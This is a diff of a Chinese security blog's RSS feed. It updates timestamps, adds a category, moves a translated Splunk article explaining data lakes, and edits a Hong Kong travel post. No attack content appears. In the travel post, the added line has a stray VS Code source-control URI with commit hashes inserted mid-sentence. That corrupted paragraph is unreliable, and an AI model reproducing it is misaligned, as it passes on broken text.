@@ -6,8 +6,8 @@
     <link>https://min168.top/</link>
     <description>网络安全知识库</description>
     <language>zh-CN</language>
-    <pubDate>Sun, 26 Jul 2026 08:06:07 GMT</pubDate>
-    <lastBuildDate>Sun, 26 Jul 2026 08:06:07 GMT</lastBuildDate>
+    <pubDate>Sun, 26 Jul 2026 08:39:03 GMT</pubDate>
+    <lastBuildDate>Sun, 26 Jul 2026 08:39:03 GMT</lastBuildDate>
     <generator>@vuepress/plugin-feed</generator>
     <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
     <category>转载</category>
@@ -30,6 +30,7 @@
     <category>基础</category>
     <category>AI</category>
     <category>其他</category>
+    <category>面试</category>
     <item>
       <title>OpenCode终极Docker部署指南：5步搭建AI开发环境</title>
       <link>https://min168.top/like/OpenCode%E7%BB%88%E6%9E%81Docker%E9%83%A8%E7%BD%B2%E6%8C%87%E5%8D%97.html</link>
@@ -314,13 +315,13 @@
       <link>https://min168.top/com/travel/2026%E9%A6%99%E6%B8%AF%E6%B8%B8%E8%AE%B0.html</link>
       <guid>https://min168.top/com/travel/2026%E9%A6%99%E6%B8%AF%E6%B8%B8%E8%AE%B0.html</guid>
       <source url="https://min168.top/rss.xml">2026港澳游记</source>
-      <description>香港之行 0x01 计划 故事开始于一次和朋友说起去香港玩的事，后来也搁置了几个月，年后才隐约有的打算，看到同事也过去玩了，所以搜索了相关攻略后，迫不及待地去办了通行证。虽然踩了几个坑，但是最后还是如愿以偿办到了。 当时照相是可以到出入境大厅免费拍照的，但是网友忽悠在手机上办理多出了20，然后办证也需要预约，要好长时间才能办，但是走人工通道也去一趟就办...</description>
+      <description>香港之行 0x01 计划 故事开始于一次和朋友说起去香港玩的事，后来也搁置了几个月，年后才隐约有的打算，看到同事也过去玩了，所以搜索了相关攻略后，迫不及待地去办了通行证。虽然踩了几个坑，但是最后还是如愿以偿办到了。 当时scm-history-item:c%3A%5Cblog?%7B%22repositoryId%22%3A%22scm0%22%2C%...</description>
       <category>香港游记</category>
       <pubDate>Wed, 13 May 2026 15:45:32 GMT</pubDate>
       <content:encoded><![CDATA[
 <h2>0x01 计划</h2>
 <p>故事开始于一次和朋友说起去香港玩的事，后来也搁置了几个月，年后才隐约有的打算，看到同事也过去玩了，所以搜索了相关攻略后，迫不及待地去办了通行证。虽然踩了几个坑，但是最后还是如愿以偿办到了。</p>
-<p>当时照相是可以到出入境大厅免费拍照的，但是网友忽悠在手机上办理多出了20，然后办证也需要预约，要好长时间才能办，但是走人工通道也去一趟就办好了，深圳的办公还是很人性化和高效的。当时签注只有香港，去拿证的时候想着也就几块钱一并签了澳门，没想到后面派上了用场。</p>
+<p>当时scm-history-item:c%3A%5Cblog?%7B%22repositoryId%22%3A%22scm0%22%2C%22historyItemId%22%3A%22790c594e4d15302438b243a9abb6d3ee595b5040%22%2C%22historyItemParentId%22%3A%22befbec2e66554a446fa8931f495f320f7bb5bad7%22%2C%22historyItemDisplayId%22%3A%22790c594%22%7D照相是可以到出入境大厅免费拍照的，但是网友忽悠在手机上办理多出了20，然后办证也需要预约，要好长时间才能办，但是走人工通道也去一趟就办好了，深圳的办公还是很人性化和高效的。当时签注只有香港，去拿证的时候想着也就几块钱一并签了澳门，没想到后面派上了用场。</p>
 <h2>0x02 出发</h2>
 <p>在周末，我随便看了攻略便出发了，从深圳湾口岸出发，顺利过境后坐上了去天水围B2P公交，支付很方便，可以使用微信和支付宝，但是也办了八达通，也埋了一个雷。<br>
 在天水围下车，手机已经没有信号，手机上买了流量卡。当时看到的是基础设施和大陆有所不同，车子都是右舵，刚来还有点不太习惯，文字使用繁体字，这导致好多文字我也不认识。<br>
@@ -4933,6 +4934,124 @@ WDAC默认限制未签名/非微软认证的代码执行。但银狐利用如下
 ]]></content:encoded>
     </item>
     <item>
+      <title>数据湖：它们是什么？为什么您的组织需要一个？</title>
+      <link>https://min168.top/like/%E6%95%B0%E6%8D%AE%E6%B9%96%EF%BC%9A%E5%AE%83%E4%BB%AC%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E4%B8%BA%E4%BB%80%E4%B9%88%E6%82%A8%E7%9A%84%E7%BB%84%E7%BB%87%E9%9C%80%E8%A6%81%E4%B8%80%E4%B8%AA%EF%BC%9F.html</link>
+      <guid>https://min168.top/like/%E6%95%B0%E6%8D%AE%E6%B9%96%EF%BC%9A%E5%AE%83%E4%BB%AC%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E4%B8%BA%E4%BB%80%E4%B9%88%E6%82%A8%E7%9A%84%E7%BB%84%E7%BB%87%E9%9C%80%E8%A6%81%E4%B8%80%E4%B8%AA%EF%BC%9F.html</guid>
+      <source url="https://min168.top/rss.xml">数据湖：它们是什么？为什么您的组织需要一个？</source>
+      <description>如今企业产生的数据量令人震惊。 然而，缺乏有效策略，大部分信息未被充分利用，数据被孤岛化。 这时，数据湖应运而生——一种强大且灵活的现代数据管理解决方案，能够将原始信息转化为有价值的资产。 如果您的组织正在寻找更好的数据处理和分析方法，本指南非常适合您。我们将解析什么是数据湖，它是如何运作的，以及为何不同行业的企业正在采用它。 数据湖介绍 让我们先从数...</description>
+      <category>应急响应</category>
+      <pubDate>Fri, 05 Dec 2025 16:22:10 GMT</pubDate>
+      <content:encoded><![CDATA[<figure><figcaption></figcaption></figure>
+<p>如今企业产生的数据量令人震惊。</p>
+<p>然而，缺乏有效策略，大部分信息未被充分利用，数据被孤岛化。</p>
+<p>这时，数据湖应运而生——一种强大且灵活的现代数据管理解决方案，能够将原始信息转化为有价值的资产。</p>
+<p>如果您的组织正在寻找更好的数据处理和分析方法，本指南非常适合您。我们将解析什么是数据湖，它是如何运作的，以及为何不同行业的企业正在采用它。</p>
+<h2>数据湖介绍</h2>
+<p>让我们先从数据湖的基本背景说起。</p>
+<h3>什么是数据湖？</h3>
+<p>数据湖是一个集中式存储库，旨在存储大量<a href="https://www.splunk.com/en_us/blog/learn/data-structured-vs-unstructured-vs-semi-structured.html" target="_blank" rel="noopener noreferrer">结构化、半结构化和非结构化数据</a>。与传统系统如数据仓库不同，数据湖不需要在存储数据<em>前</em>预定义模式。</p>
+<p>这使得它成为处理各种原始数据的组织的理想解决方案。可以把数据湖想象成一个广阔的开阔水域，数据流从多个来源流入。这包括从<a href="https://www.splunk.com/en_us/blog/learn/database-monitoring.html" target="_blank" rel="noopener noreferrer">数据库</a>、物联网设备到社交媒体平台和应用日志的各种各样。</p>
+<figure><figcaption></figcaption></figure>
+<h3>数据湖的组成部分</h3>
+<p>数据湖通常由三个主要组成部分组成：</p>
+<ul>
+<li><strong>数据摄取层：</strong> 该组件收集并加载来自多个来源的数据到存储层。</li>
+<li><strong>存储层：</strong> 这里存储所有原始数据。</li>
+<li><strong>数据处理与分析层：</strong> 这里的数据会被转换、清洗，并为不同工具和应用的分析做准备。</li>
+</ul>
+<p>其他辅助组件可能包括<a href="https://www.splunk.com/en_us/blog/learn/metadata-management.html" target="_blank" rel="noopener noreferrer">元数据管理</a>工具、安全框架和治理策略。</p>
+<h3>数据湖与数据仓库和数据湖仓一体有何不同？</h3>
+<p>了解<a href="https://www.splunk.com/en_us/blog/learn/data-warehouse-vs-data-lake.html" target="_blank" rel="noopener noreferrer">数据湖和数据仓库之间的</a>区别至关重要，因为它们通常相互补充而不是替代。</p>
+<ul>
+<li><strong>数据湖以其</strong>原生形式存储原始数据，而不强加固定结构。它们具有高度可扩展性、成本效益，并支持机器学习等高级分析方法。</li>
+<li><strong>数据仓库</strong>是处理数据以适应定义架构的结构化环境。它们针对<a href="https://www.splunk.com/en_us/blog/learn/business-intelligence.html" target="_blank" rel="noopener noreferrer">商业智能 （BI）</a> 工具和事务查询进行了优化，提供高性能但灵活性有限。</li>
+</ul>
+<p>这意味着数据湖能够保存图像、视频和文本等非结构化数据，而数据仓库更适合数字和日期等结构化数据。</p>
+<p>还有<a href="https://www.splunk.com/en_us/blog/learn/data-lakehouses.html" target="_blank" rel="noopener noreferrer">数据湖仓一体，</a>这是一种现代混合架构，将数据湖的可扩展性和灵活性与数据仓库的结构化数据管理和性能相结合。它支持来自统一平台的高级分析和商业智能。</p>
+<figure><figcaption></figcaption></figure>
+<p><em>这些照片展示了基本原理：数据湖没有像自然湖那样被强加的结构，而数据仓库则是为特定用途组织数据。</em></p>
+<h2>实现数据湖的好处</h2>
+<p>采用数据湖为企业带来了几项主要优势：</p>
+<h3>无缝数据访问</h3>
+<p>数据湖支持将信息从经常孤立的来源收集到一个中心位置。这种可访问性使<a href="https://www.splunk.com/en_us/blog/learn/data-analyst-role.html" target="_blank" rel="noopener noreferrer">分析师</a>、<a href="https://www.splunk.com/en_us/blog/learn/data-scientist-role-responsibilities.html" target="_blank" rel="noopener noreferrer">数据科学家</a>和<a href="https://www.splunk.com/en_us/blog/learn/chief-data-officer-role-responsibilities.html" target="_blank" rel="noopener noreferrer">高管</a>能够从相同的信息中汲取信息，从而减少数据驱动决策中的摩擦。</p>
+<h3>所有数据类型的灵活性</h3>
+<p>与最适合处理结构化数据的数据<a href="https://www.splunk.com/en_us/blog/learn/data-warehouse-vs-data-lake.html" target="_blank" rel="noopener noreferrer">仓库</a>不同，数据湖可以容纳任何类型的数据：文本、图像、视频、流数据，应有尽有。组织可以进行创新，而不会被僵化的模式所束缚。</p>
+<h3>可扩展性促进增长</h3>
+<p>AWS S3 和 Azure Data Lake 等现代解决方案可以轻松扩展 PB 级数据，而不会显着增加成本。数据湖的弹性特性可确保您的存储随着业务的增长而发展。</p>
+<h3>启用高级分析</h3>
+<p>对于探索机器学习、<a href="https://www.splunk.com/en_us/blog/learn/big-data-analytics.html" target="_blank" rel="noopener noreferrer">大数据分析</a>或<a href="https://www.splunk.com/en_us/blog/learn/predictive-modeling.html" target="_blank" rel="noopener noreferrer">预测建模</a>的组织来说，数据湖是黄金标准。</p>
+<p>数据团队能够通过使用数据湖直接访问原始数据。这使他们能够执行传统 BI 系统中无法实现的先进技术。例如，<a href="https://www.splunk.com/en_us/form/aws-security-lake-brief.html" target="_blank" rel="noopener noreferrer">Amazon Security Lake 和 Splunk 为高级分析功能提供了一个集成的集中式数据湖</a>。</p>
+<h3>成本效益</h3>
+<p>数据湖的存储解决方案明显比高性能数据库或仓库更实惠。此外，随着对大量 ETL（提取、转换、加载）准备的需求减少，数据湖可以显着节省成本。</p>
+<h2>数据湖工具和平台</h2>
+<p>要正确实施数据湖，您需要一个现成的解决方案。存在多种数据湖解决方案，可满足各种用例和预算限制。</p>
+<p>一些流行的选项包括：</p>
+<ul>
+<li><a href="https://aws.amazon.com/big-data/datalakes-and-analytics/datalakes/" target="_blank" rel="noopener noreferrer">AWS S3</a>​ <strong>：</strong> Amazon 基于云的存储服务具有高度可扩展性、经济实惠且易于与其他 AWS 服务集成。</li>
+<li><a href="https://learn.microsoft.com/en-us/azure/storage/blobs/data-lake-storage-introduction" target="_blank" rel="noopener noreferrer">Azure Data Lake Store （ADLS）：</a>ADLS 基于 Azure Blob 存储构建，支持在云中存储 PB 级非结构化数据。</li>
+<li><a href="https://cloud.google.com/?hl=en" target="_blank" rel="noopener noreferrer">谷歌云平台</a>​ <strong>：</strong> Google 提供多种数据湖解决方案，包括 Google Cloud Storage 和 BigQuery，可根据不同的业务需求量身定制。</li>
+<li><a href="https://hadoop.apache.org/" target="_blank" rel="noopener noreferrer">Hadoop</a>​ <strong>：</strong> 支持大数据处理能力的开源框架。Hadoop 用于世界上一些最广泛的数据湖。</li>
+<li><a href="https://www.snowflake.com/en/" target="_blank" rel="noopener noreferrer">Snowflake</a>​ <strong>：</strong> 一个一体化数据平台，结合了传统数据仓库和数据湖的功能。</li>
+</ul>
+<h3>Splunk 是数据湖吗？</h3>
+<p>Splunk 不是传统的数据湖，但提供了一些类似的功能。它主要是一个分析和可观察性平台，用于收集、索引和分析机器生成的数据，如<a href="https://www.splunk.com/en_us/blog/learn/logs-vs-metrics.html" target="_blank" rel="noopener noreferrer">日志和指标</a>。</p>
+<p>虽然 <a href="https://www.splunk.com/en_us/products/platform.html" target="_blank" rel="noopener noreferrer">Splunk 数据平台</a>可以存储大量半结构化数据，但其优势在于实时搜索、警报和监控，尤其是在 IT 运营、安全和 DevOps 方面。</p>
+<p>Splunk 可以在特定场景中充<em>当</em>数据湖，<a href="https://docs.splunk.com/Documentation/SplunkCloud/9.3.2408/FederatedSearch/faaslDataLakeIndexes" target="_blank" rel="noopener noreferrer">例如 Amazon Security Lake</a> 或 Splunk Data Fabric Search，它可以集中和分析原始数据。但是，它并不是被设计成一个全面的、架构灵活的数据湖，供广泛的企业使用。</p>
+<p>*(*​<a href="https://www.splunk.com/en_us/products.html" target="_blank" rel="noopener noreferrer">探索用于数据管理、可观测性和网络安全的 Splunk 统一平台</a>​ <em>。</em></p>
+<iframe class="vidyard_iframe" title="Building a Better Lake: How to Utilize Federated Search for Amazon Security Lake" src="https://play.vidyard.com/6iFwuVE8AT2TCfNpNCRGyU.html?" width="640" height="360" frameborder="0">&amp;nbsp;</iframe>
+<h2>真实世界的数据湖用例</h2>
+<p>各行各业的许多组织都依靠数据湖来推动创新。这里有几个例子：</p>
+<p>​<strong>零售业的客户个性化</strong>：零售连锁店使用数据湖来集成购买历史记录、社交媒体活动和网站行为。这种统一的数据可以为个人客户提供高度定制的购物体验。</p>
+<p><strong>医疗保健数据集成：</strong>  医院和实验室将病历、影像数据和患者遥测数据存储在数据湖中。这可以简化研究、预测性诊断并改善患者护理。</p>
+<p>**物联网和智能设备分析：**​<a href="https://corsosystems.com/posts/how-to-use-data-lakes-in-manufacturing" target="_blank" rel="noopener noreferrer">制造公司利用数据湖</a>来分析来自连接设备的高速物联网数据，帮助他们预测维护需求、优化工作流程并最大限度地减少停机时间。</p>
+<p><strong>金融风险管理：</strong>  银行使用数据湖来模拟客户行为并预测信用违约或欺诈等风险。通过将结构化财务记录与非结构化网络活动相结合，银行可以改进其整体风险管理策略。</p>
+<p>*（相关阅读：*​<a href="https://www.splunk.com/en_us/blog/learn/fcrm-financial-crime-risk-management.html" target="_blank" rel="noopener noreferrer">金融犯罪风险管理</a>​ <em>）</em></p>
+<h2>构建和维护数据湖：最佳实践</h2>
+<p>为了最大限度地发挥数据湖的效用，必须遵循以下分步最佳实践：</p>
+<h3>1. 从明确的数据治理策略开始</h3>
+<p>如果没有适当的治理，您的数据湖就有可能成为“<a href="https://www.alation.com/blog/data-swamp-lake-lakehouse/" target="_blank" rel="noopener noreferrer">数据沼泽</a>”，信息杂乱无章且难以提取。您还应该在流程的早期建立数据组织、使用和访问规则。</p>
+<p>有效的数据治理<em>实际上</em>与组织无关，它对于满足 GDPR、HIPAA 或 <a href="https://www.splunk.com/en_us/blog/learn/soc-compliance.html" target="_blank" rel="noopener noreferrer">SOC 2</a> 等<a href="https://www.splunk.com/en_us/blog/learn/regulatory-compliance.html" target="_blank" rel="noopener noreferrer">法规遵从性标准</a>至关重要。确保适当的访问控制、审计跟踪和数据沿袭跟踪有助于企业避免法律陷阱并维护客户信任。</p>
+<h3>2. 优先考虑安全</h3>
+<p>通过实施强大的用户身份验证、加密和合规性监控来确保数据湖的安全性。<a href="https://aws.amazon.com/lake-formation/" target="_blank" rel="noopener noreferrer"> AWS Lake Formation</a> 等技术使组织能够无缝地完成这一过程。</p>
+<h3>3. 维护元数据以加快检索速度</h3>
+<p>包括元数据标记，以帮助用户有效地搜索、定位和检索数据。<a href="https://atlas.apache.org/#/" target="_blank" rel="noopener noreferrer"> Apache Atlas</a> 等工具可以帮助管理整个湖中的综合元数据。</p>
+<h3>4. 设计灵活的数据管道</h3>
+<p><a href="https://spark.apache.org/" target="_blank" rel="noopener noreferrer"> Apache Spark</a> 和<a href="https://aws.amazon.com/glue/" target="_blank" rel="noopener noreferrer"> AWS Glue</a> 等平台简化了提取、转换和加载数据的过程，而不会将您锁定在特定的架构要求中。这符合数据湖的流体存储理念。</p>
+<h3>5. 定期监控绩效</h3>
+<p>请务必密切关注用户查询、作业运行时和数据存储成本。尝试寻找瓶颈并优化作，以确保数据湖随着您的使用模式而发展。</p>
+<h3>6. 优化性能</h3>
+<p>主动优化数据湖可以显著提高性能并降低成本。</p>
+<ul>
+<li>按时间或类别对数据进行分区，通过缩小搜索范围来加快查询执行速度。</li>
+<li>使用 Parquet 或 ORC 等列式存储格式可提高读取效率并减少存储占用空间。</li>
+<li>实现查询加速层（例如，物化视图或缓存引擎）可以缩短重复查询的响应时间。</li>
+</ul>
+<p>这些实践共同确保你的数据湖高效存储数据，同时快速可靠地提供洞察。</p>
+<h3>7. 管理数据生命周期</h3>
+<p>随着数据湖的扩大，管理<a href="https://www.splunk.com/en_us/blog/learn/dlm-data-lifecycle-management.html" target="_blank" rel="noopener noreferrer">存储数据的生命周期</a>变得至关重要。并非所有数据都具有长期价值，因此实施策略——如归档、分层存储或自动删除陈旧数据集——有助于控制存储成本并优化性能。</p>
+<p>许多云服务提供商提供内置生命周期策略来自动化这一流程。</p>
+<figure><figcaption></figcaption></figure>
+<h2>管理数据湖的挑战（以及如何解决这些挑战）</h2>
+<p>虽然数据湖的优势引人注目，但也有一些挑战需要考虑：</p>
+<ul>
+<li><strong>数据质量差：</strong>  原始数据通常存在不一致、错误和重复。实施自动清理工具和数据验证管道，以确保高质量的输入。</li>
+<li><strong>压倒性的体积：</strong>  未经过滤的大量数据可能会让用户不知所措。实施高效的索引和元数据标记可以缓解这种情况。</li>
+<li><strong>用户访问复杂性：</strong>  新用户可能难以查询非结构化数据。为了克服这个问题，请投资用户友好的查询解决方案，例如 <a href="https://prestodb.io/" target="_blank" rel="noopener noreferrer">Presto</a> 或 <a href="https://www.integrate.io/blog/12-sql-on-hadoop-tools/" target="_blank" rel="noopener noreferrer">SQL-on-Hadoop 工具</a>。</li>
+</ul>
+<h2>数据湖的未来趋势</h2>
+<p>随着数据生态系统的发展，数据湖变得更加智能和统一。新兴趋势包括：</p>
+<ul>
+<li>用于自动标记和发现的 AI 驱动的数据编目</li>
+<li>将分析性能与灵活性融为一体的数据湖屋的兴起</li>
+<li>与实时流媒体平台更紧密地集成。</li>
+</ul>
+<p>组织也正在转向受监管的自助服务模式，允许更多团队在不大量 IT 参与的情况下访问和分析数据，同时保持控制和合规性。</p>
+<h2>利用数据湖的力量</h2>
+<p>精心设计的数据湖不仅仅是高级存储解决方案，还提供了统一组织数据的机会。</p>
+<p>要从不同和孤立的数据中引入新的业务洞察，请考虑立即为您的企业构建数据湖。</p>
+]]></content:encoded>
+    </item>
+    <item>
       <title>GitHub Codespaces</title>
       <link>https://min168.top/net/GitHub%20Codespaces.html</link>
       <guid>https://min168.top/net/GitHub%20Codespaces.html</guid>
@@ -5061,124 +5180,6 @@ WDAC默认限制未签名/非微软认证的代码执行。但银狐利用如下
 <span class="line"><span>git commit -m "更新"</span></span>
 <span class="line"><span>git push</span></span></code></pre>
 <div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
-    </item>
-    <item>
-      <title>数据湖：它们是什么？为什么您的组织需要一个？</title>
-      <link>https://min168.top/like/%E6%95%B0%E6%8D%AE%E6%B9%96%EF%BC%9A%E5%AE%83%E4%BB%AC%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E4%B8%BA%E4%BB%80%E4%B9%88%E6%82%A8%E7%9A%84%E7%BB%84%E7%BB%87%E9%9C%80%E8%A6%81%E4%B8%80%E4%B8%AA%EF%BC%9F.html</link>
-      <guid>https://min168.top/like/%E6%95%B0%E6%8D%AE%E6%B9%96%EF%BC%9A%E5%AE%83%E4%BB%AC%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E4%B8%BA%E4%BB%80%E4%B9%88%E6%82%A8%E7%9A%84%E7%BB%84%E7%BB%87%E9%9C%80%E8%A6%81%E4%B8%80%E4%B8%AA%EF%BC%9F.html</guid>
-      <source url="https://min168.top/rss.xml">数据湖：它们是什么？为什么您的组织需要一个？</source>
-      <description>如今企业产生的数据量令人震惊。 然而，缺乏有效策略，大部分信息未被充分利用，数据被孤岛化。 这时，数据湖应运而生——一种强大且灵活的现代数据管理解决方案，能够将原始信息转化为有价值的资产。 如果您的组织正在寻找更好的数据处理和分析方法，本指南非常适合您。我们将解析什么是数据湖，它是如何运作的，以及为何不同行业的企业正在采用它。 数据湖介绍 让我们先从数...</description>
-      <category>应急响应</category>
-      <pubDate>Fri, 05 Dec 2025 16:22:10 GMT</pubDate>
-      <content:encoded><![CDATA[<figure><figcaption></figcaption></figure>
-<p>如今企业产生的数据量令人震惊。</p>
-<p>然而，缺乏有效策略，大部分信息未被充分利用，数据被孤岛化。</p>
-<p>这时，数据湖应运而生——一种强大且灵活的现代数据管理解决方案，能够将原始信息转化为有价值的资产。</p>
-<p>如果您的组织正在寻找更好的数据处理和分析方法，本指南非常适合您。我们将解析什么是数据湖，它是如何运作的，以及为何不同行业的企业正在采用它。</p>
-<h2>数据湖介绍</h2>
-<p>让我们先从数据湖的基本背景说起。</p>
-<h3>什么是数据湖？</h3>
-<p>数据湖是一个集中式存储库，旨在存储大量<a href="https://www.splunk.com/en_us/blog/learn/data-structured-vs-unstructured-vs-semi-structured.html" target="_blank" rel="noopener noreferrer">结构化、半结构化和非结构化数据</a>。与传统系统如数据仓库不同，数据湖不需要在存储数据<em>前</em>预定义模式。</p>
-<p>这使得它成为处理各种原始数据的组织的理想解决方案。可以把数据湖想象成一个广阔的开阔水域，数据流从多个来源流入。这包括从<a href="https://www.splunk.com/en_us/blog/learn/database-monitoring.html" target="_blank" rel="noopener noreferrer">数据库</a>、物联网设备到社交媒体平台和应用日志的各种各样。</p>
-<figure><figcaption></figcaption></figure>
-<h3>数据湖的组成部分</h3>
-<p>数据湖通常由三个主要组成部分组成：</p>
-<ul>
-<li><strong>数据摄取层：</strong> 该组件收集并加载来自多个来源的数据到存储层。</li>
-<li><strong>存储层：</strong> 这里存储所有原始数据。</li>
-<li><strong>数据处理与分析层：</strong> 这里的数据会被转换、清洗，并为不同工具和应用的分析做准备。</li>
-</ul>
-<p>其他辅助组件可能包括<a href="https://www.splunk.com/en_us/blog/learn/metadata-management.html" target="_blank" rel="noopener noreferrer">元数据管理</a>工具、安全框架和治理策略。</p>
-<h3>数据湖与数据仓库和数据湖仓一体有何不同？</h3>
-<p>了解<a href="https://www.splunk.com/en_us/blog/learn/data-warehouse-vs-data-lake.html" target="_blank" rel="noopener noreferrer">数据湖和数据仓库之间的</a>区别至关重要，因为它们通常相互补充而不是替代。</p>
-<ul>
-<li><strong>数据湖以其</strong>原生形式存储原始数据，而不强加固定结构。它们具有高度可扩展性、成本效益，并支持机器学习等高级分析方法。</li>
-<li><strong>数据仓库</strong>是处理数据以适应定义架构的结构化环境。它们针对<a href="https://www.splunk.com/en_us/blog/learn/business-intelligence.html" target="_blank" rel="noopener noreferrer">商业智能 （BI）</a> 工具和事务查询进行了优化，提供高性能但灵活性有限。</li>
-</ul>
-<p>这意味着数据湖能够保存图像、视频和文本等非结构化数据，而数据仓库更适合数字和日期等结构化数据。</p>
-<p>还有<a href="https://www.splunk.com/en_us/blog/learn/data-lakehouses.html" target="_blank" rel="noopener noreferrer">数据湖仓一体，</a>这是一种现代混合架构，将数据湖的可扩展性和灵活性与数据仓库的结构化数据管理和性能相结合。它支持来自统一平台的高级分析和商业智能。</p>
-<figure><figcaption></figcaption></figure>
-<p><em>这些照片展示了基本原理：数据湖没有像自然湖那样被强加的结构，而数据仓库则是为特定用途组织数据。</em></p>
-<h2>实现数据湖的好处</h2>
-<p>采用数据湖为企业带来了几项主要优势：</p>
-<h3>无缝数据访问</h3>
-<p>数据湖支持将信息从经常孤立的来源收集到一个中心位置。这种可访问性使<a href="https://www.splunk.com/en_us/blog/learn/data-analyst-role.html" target="_blank" rel="noopener noreferrer">分析师</a>、<a href="https://www.splunk.com/en_us/blog/learn/data-scientist-role-responsibilities.html" target="_blank" rel="noopener noreferrer">数据科学家</a>和<a href="https://www.splunk.com/en_us/blog/learn/chief-data-officer-role-responsibilities.html" target="_blank" rel="noopener noreferrer">高管</a>能够从相同的信息中汲取信息，从而减少数据驱动决策中的摩擦。</p>
-<h3>所有数据类型的灵活性</h3>
-<p>与最适合处理结构化数据的数据<a href="https://www.splunk.com/en_us/blog/learn/data-warehouse-vs-data-lake.html" target="_blank" rel="noopener noreferrer">仓库</a>不同，数据湖可以容纳任何类型的数据：文本、图像、视频、流数据，应有尽有。组织可以进行创新，而不会被僵化的模式所束缚。</p>
-<h3>可扩展性促进增长</h3>
-<p>AWS S3 和 Azure Data Lake 等现代解决方案可以轻松扩展 PB 级数据，而不会显着增加成本。数据湖的弹性特性可确保您的存储随着业务的增长而发展。</p>
-<h3>启用高级分析</h3>
-<p>对于探索机器学习、<a href="https://www.splunk.com/en_us/blog/learn/big-data-analytics.html" target="_blank" rel="noopener noreferrer">大数据分析</a>或<a href="https://www.splunk.com/en_us/blog/learn/predictive-modeling.html" target="_blank" rel="noopener noreferrer">预测建模</a>的组织来说，数据湖是黄金标准。</p>
-<p>数据团队能够通过使用数据湖直接访问原始数据。这使他们能够执行传统 BI 系统中无法实现的先进技术。例如，<a href="https://www.splunk.com/en_us/form/aws-security-lake-brief.html" target="_blank" rel="noopener noreferrer">Amazon Security Lake 和 Splunk 为高级分析功能提供了一个集成的集中式数据湖</a>。</p>
-<h3>成本效益</h3>
-<p>数据湖的存储解决方案明显比高性能数据库或仓库更实惠。此外，随着对大量 ETL（提取、转换、加载）准备的需求减少，数据湖可以显着节省成本。</p>
-<h2>数据湖工具和平台</h2>
-<p>要正确实施数据湖，您需要一个现成的解决方案。存在多种数据湖解决方案，可满足各种用例和预算限制。</p>
-<p>一些流行的选项包括：</p>
-<ul>
-<li><a href="https://aws.amazon.com/big-data/datalakes-and-analytics/datalakes/" target="_blank" rel="noopener noreferrer">AWS S3</a>​ <strong>：</strong> Amazon 基于云的存储服务具有高度可扩展性、经济实惠且易于与其他 AWS 服务集成。</li>
-<li><a href="https://learn.microsoft.com/en-us/azure/storage/blobs/data-lake-storage-introduction" target="_blank" rel="noopener noreferrer">Azure Data Lake Store （ADLS）：</a>ADLS 基于 Azure Blob 存储构建，支持在云中存储 PB 级非结构化数据。</li>
-<li><a href="https://cloud.google.com/?hl=en" target="_blank" rel="noopener noreferrer">谷歌云平台</a>​ <strong>：</strong> Google 提供多种数据湖解决方案，包括 Google Cloud Storage 和 BigQuery，可根据不同的业务需求量身定制。</li>
-<li><a href="https://hadoop.apache.org/" target="_blank" rel="noopener noreferrer">Hadoop</a>​ <strong>：</strong> 支持大数据处理能力的开源框架。Hadoop 用于世界上一些最广泛的数据湖。</li>
-<li><a href="https://www.snowflake.com/en/" target="_blank" rel="noopener noreferrer">Snowflake</a>​ <strong>：</strong> 一个一体化数据平台，结合了传统数据仓库和数据湖的功能。</li>
-</ul>
-<h3>Splunk 是数据湖吗？</h3>
-<p>Splunk 不是传统的数据湖，但提供了一些类似的功能。它主要是一个分析和可观察性平台，用于收集、索引和分析机器生成的数据，如<a href="https://www.splunk.com/en_us/blog/learn/logs-vs-metrics.html" target="_blank" rel="noopener noreferrer">日志和指标</a>。</p>
-<p>虽然 <a href="https://www.splunk.com/en_us/products/platform.html" target="_blank" rel="noopener noreferrer">Splunk 数据平台</a>可以存储大量半结构化数据，但其优势在于实时搜索、警报和监控，尤其是在 IT 运营、安全和 DevOps 方面。</p>
-<p>Splunk 可以在特定场景中充<em>当</em>数据湖，<a href="https://docs.splunk.com/Documentation/SplunkCloud/9.3.2408/FederatedSearch/faaslDataLakeIndexes" target="_blank" rel="noopener noreferrer">例如 Amazon Security Lake</a> 或 Splunk Data Fabric Search，它可以集中和分析原始数据。但是，它并不是被设计成一个全面的、架构灵活的数据湖，供广泛的企业使用。</p>
-<p>*(*​<a href="https://www.splunk.com/en_us/products.html" target="_blank" rel="noopener noreferrer">探索用于数据管理、可观测性和网络安全的 Splunk 统一平台</a>​ <em>。</em></p>
-<iframe class="vidyard_iframe" title="Building a Better Lake: How to Utilize Federated Search for Amazon Security Lake" src="https://play.vidyard.com/6iFwuVE8AT2TCfNpNCRGyU.html?" width="640" height="360" frameborder="0">&amp;nbsp;</iframe>
-<h2>真实世界的数据湖用例</h2>
-<p>各行各业的许多组织都依靠数据湖来推动创新。这里有几个例子：</p>
-<p>​<strong>零售业的客户个性化</strong>：零售连锁店使用数据湖来集成购买历史记录、社交媒体活动和网站行为。这种统一的数据可以为个人客户提供高度定制的购物体验。</p>
-<p><strong>医疗保健数据集成：</strong>  医院和实验室将病历、影像数据和患者遥测数据存储在数据湖中。这可以简化研究、预测性诊断并改善患者护理。</p>
-<p>**物联网和智能设备分析：**​<a href="https://corsosystems.com/posts/how-to-use-data-lakes-in-manufacturing" target="_blank" rel="noopener noreferrer">制造公司利用数据湖</a>来分析来自连接设备的高速物联网数据，帮助他们预测维护需求、优化工作流程并最大限度地减少停机时间。</p>
-<p><strong>金融风险管理：</strong>  银行使用数据湖来模拟客户行为并预测信用违约或欺诈等风险。通过将结构化财务记录与非结构化网络活动相结合，银行可以改进其整体风险管理策略。</p>
-<p>*（相关阅读：*​<a href="https://www.splunk.com/en_us/blog/learn/fcrm-financial-crime-risk-management.html" target="_blank" rel="noopener noreferrer">金融犯罪风险管理</a>​ <em>）</em></p>
-<h2>构建和维护数据湖：最佳实践</h2>
-<p>为了最大限度地发挥数据湖的效用，必须遵循以下分步最佳实践：</p>
-<h3>1. 从明确的数据治理策略开始</h3>
